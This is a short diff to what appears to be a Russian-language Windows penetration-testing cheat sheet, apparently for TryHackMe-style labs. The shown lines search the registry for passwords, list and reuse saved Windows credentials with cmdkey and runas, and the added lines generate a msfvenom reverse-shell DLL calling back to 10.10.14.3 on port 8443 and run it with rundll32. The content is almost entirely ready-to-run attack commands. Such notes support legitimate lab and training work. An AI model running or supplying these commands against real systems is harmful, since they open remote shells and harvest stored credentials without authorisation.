@@ -50,6 +50,10 @@ reg query HKLM /f password /t REG_SZ /s | findstr /s flag
     # Посмотреть сохраненный креды windows
     cmdkey /list
     runas /savecred /user:THM.red\thm-local cmd.exe
+# Запуск DLL из msvenom
+
+    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
+    rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
 
 # повышение привелегий серез UAC
 
